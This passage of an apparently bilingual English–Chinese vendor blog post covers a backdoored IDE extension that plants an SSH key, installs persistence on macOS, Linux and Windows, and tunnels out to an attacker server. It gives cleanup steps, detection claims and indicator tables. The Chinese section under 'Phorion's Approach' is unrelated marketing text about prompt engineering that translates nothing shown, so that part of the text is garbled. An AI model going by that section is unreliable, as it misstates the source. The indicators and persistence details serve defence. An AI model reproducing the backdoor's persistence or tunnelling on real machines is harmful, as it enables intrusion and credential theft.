2. **删除 persistence：** 终止并删除 macOS 上的 `~/Library/LaunchAgents/com.apple.sysmond.plist`，或在 Linux 上清理 `@reboot` cron 条目，在 Windows 上删除 `SysMon` 计划任务和启动脚本，并删除 `~/.config/.smt` 和 `~/.config/.smtk`。  
3. **清理 SSH 密钥和状态：** 从 `~/.ssh/authorized_keys` 删除 `svc-telemetry` 公钥，删除 `/tmp/.stk_*`，并确认 Remote Login (SSH) 未意外启用。  
4. **旋转凭据：** 如果 SSH 在主机上启用，或者存在入站登录的任何证据，则旋转该用户账户可访问的所有凭据或令牌（尤其是匹配 `KEY|TOKEN|SECRET|PASS|AWS|GCP` 环境变量过滤的）。

> ## Phorion’s Approach

## Phorion 的方法

### 简介
Phorion 采用了一种独特的方法来处理自然语言处理任务，其核心是将先进的语言模型与专业的提示工程相结合。通过精心设计和优化的提示，Phorion 能够显著提升模型的理解和生成能力，从而在各种应用场景中实现更出色的性能。

### 关键技术
1. **提示工程**：通过结构化和上下文相关的提示设计，Phorion 能够引导模型聚焦于特定任务，从而提高其准确性和一致性。
2. **上下文感知**：Phorion 利用先进的上下文建模技术，确保模型在生成响应时能够充分考虑前文信息，提供更连贯、更自然的对话体验。
3. ** fine-tuning 优化**：通过针对特定任务的数据集进行 fine-tuning，Phorion 能够适应各种领域的专业语言，使其在医疗、法律等特定领域表现出色。

### 应用场景
- **客户服务**：Phorion 能够自动生成个性化的回复，提升客户满意度，同时降低运营成本。
- **内容创作**：在博客、新闻和营销文案等领域，Phorion 能够快速生成高质量的内容，满足多样化的需求。
- **知识问答**：Phorion 能够理解复杂的问题，提供准确、简洁的答案，帮助用户高效获取信息。

### 优势
- **高准确性**：通过精心设计的提示和针对性训练，Phorion 能够实现更高的答案准确率。
- **灵活扩展**：Phorion 支持多种语言模型和任务类型，能够轻松适应不断变化的需求。
- **易于部署**：Phorion 提供简单的集成接口，即使是非技术人员也能快速上手。

### 未来展望
随着人工智能技术的不断进步，Phorion 将继续探索新的提示工程方法，整合更多先进的语言模型技术，以实现更智能、更自然的语言交互体验。通过持续的技术创新，Phorion 致力于为用户提供最优质的自然语言处理解决方案。

> Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating `com.apple.*` LaunchAgents and LaunchAgents executing shell scripts from hidden directories.

Phorion 的开箱即用检测覆盖在多个规则中标记了此次攻击中使用的 macOS 持久化，包括非 Apple 进程创建 `com.apple.*` LaunchAgents 以及 LaunchAgents 从隐藏目录执行 shell 脚本。

> Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying `~/.ssh/authorized_keys` directly, and [Phorion Protections](https://phorion.io/blog/phorion-protections/) can be used to lock down `~/.ssh/` so that only authorised processes can read or modify SSH keys and configuration files in the first place.

除持久化之外，Phorion 的文件访问遥测捕获到 IDE 扩展宿主直接修改 `~/.ssh/authorized_keys`，并且 [Phorion Protections](https://phorion.io/blog/phorion-protections/) 可用于锁定 `~/.ssh/`，以便从一开始就只有授权进程才能读取或修改 SSH 密钥和配置文件。

> If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, [get in touch to arrange a demo](#cta).

如果您想了解 Phorion 如何在您的 Mac 设备群中检测并阻止此类供应链威胁，请[联系我们安排演示](#cta)。

> ## Indicators

## 指标

> ### Sample and Public-Key Fingerprints

### 示例与公钥指纹

> | Indicator | Value | Notes |
> | --- | --- | --- |
> | SHA-256 | `ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15` | Backdoored `extension.js` bundle |
> | Victim-login public-key fingerprint | `SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk` | Ed25519 key appended to `~/.ssh/authorized_keys` (comment `svc-telemetry`) |
> | Tunnel public-key fingerprint | `SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ` | Embedded Ed25519 key used to authenticate to the tunnel server (comment `svc-telemetry-tun`) |

| 指标 | 值 | 备注 |
| --- | --- | --- |
| SHA-256 | `ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15` | 后门 `extension.js` 捆绑包 |
| 受害者登录公钥指纹 | `SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk` | Ed25519 密钥追加到 `~/.ssh/authorized_keys`（注释 `svc-telemetry`） |
| 隧道公钥指纹 | `SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ` | 用于向隧道服务器进行身份验证的嵌入式 Ed25519 密钥（注释 `svc-telemetry-tun`） |

> ### Network Indicators

### 网络指标

> | Indicator | Type | Notes |
> | --- | --- | --- |
> | `134.209.82[.]225` (TCP `22`, user `tunnel`) | IP / SSH | Outbound reverse SSH tunnel server |
> | `134.209.82[.]225:8099` (`POST /beacon`) | IP / HTTP | External host-report beacon endpoint |
> | `127.0.0.1:8099` (`POST /beacon`) | Loopback / HTTP | Local beacon destination |
> | `ifconfig[.]me`, `api[.]ipify[.]org` | Domain | Legitimate services queried for public IP discovery |



| 指标 | 类型 | 备注 |
| --- | --- | --- |
| `134.209.82[.]225` (TCP `22`, user `tunnel`) | IP / SSH | 出站反向 SSH 隧道服务器 |
| `134.209.82[.]225:8099` (`POST /beacon`) | IP / HTTP | 外部主机上报信标端点 |
| `127.0.0.1:8099` (`POST /beacon`) | Loopback / HTTP | 本地信标目的地 |
| `ifconfig[.]me`, `api[.]ipify[.]org` | 域名 | 用于查询公网 IP 的合法服务 |

> ### Host Artifacts

### 主机制品

> | Artifact | Platform | Notes |
> | --- | --- | --- |
> | `~/.<ide>/extensions/anthropic.claude-code-2.1.312-darwin-arm64` | macOS (Apple Silicon) | Additional affected version identified in Cursor’s security notice (`<ide>` varies by editor) |
> | `~/.<ide>/extensions/anthropic.claude-code-2.1.313-darwin-arm64` | macOS (Apple Silicon) | Installed extension directory (`<ide>` varies by editor) |
> | `~/.ssh/authorized_keys` (comment `svc-telemetry`) | All | Planted Ed25519 public key |
> | `<TMP>/.stk_<10 hex chars>` (`$TMPDIR/.stk_*` on macOS) | All | Initial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of `MD5(hostname + HOME)`) |
> | `~/.config/.smt` and `~/.config/.smtk` | macOS, Linux | Persistence shell script and recreated tunnel private key |
> | `~/Library/LaunchAgents/com.apple.sysmond.plist` | macOS | User LaunchAgent executing `/bin/sh ~/.config/.smt` |
> | `@reboot` cron entry for `~/.config/.smt` | Linux | User crontab persistence |
> | `~/.config/smt.cmd` and `~/.config/smtk` | Windows | Persistence batch script and tunnel private key |
> | Scheduled task `SysMon` | Windows | Startup scheduled task (requests `SYSTEM`) |
> | `%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd` | Windows | Startup folder fallback script |

|  构件 | 平台 | 备注 |
| --- | --- | --- |
| `~/.<ide>/extensions/anthropic.claude-code-2.1.312-darwin-arm64` | macOS (Apple Silicon) | Cursor 安全通告中确定的额外受影响版本（`<ide>` 因编辑器而异） |
| `~/.<ide>/extensions/anthropic.claude-code-2.1.313-darwin-arm64` | macOS (Apple Silicon) | 已安装的扩展目录（`<ide>` 因编辑器而异） |
| `~/.ssh/authorized_keys`（注释 `svc-telemetry`） | 所有平台 | 植入的 Ed25519 公钥 |
| `<TMP>/.stk_<10个十六进制字符>`（macOS 上为 `$TMPDIR/.stk_*`） | 所有平台 | 操作系统临时目录中的初始隧道私钥（后缀为 `MD5(hostname + HOME)` 的前 10 个十六进制字符） |
| `~/.config/.smt` 和 `~/.config/.smtk` | macOS, Linux | 持久化 Shell 脚本和重建的隧道私钥 |
| `~/Library/LaunchAgents/com.apple.sysmond.plist` | macOS | 执行 `/bin/sh ~/.config/.smt` 的用户 LaunchAgent |
| `@reboot` 计划任务条目针对 `~/.config/.smt` | Linux | 用户 crontab 持久化 |
| `~/.config/smt.cmd` 和 `~/.config/smtk` | Windows | 持久化批处理脚本和隧道私钥 |
| 计划任务 `SysMon` | Windows | 启动计划任务（请求 `SYSTEM` 权限） |
| `%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd` | Windows | 启动文件夹备用脚本 |
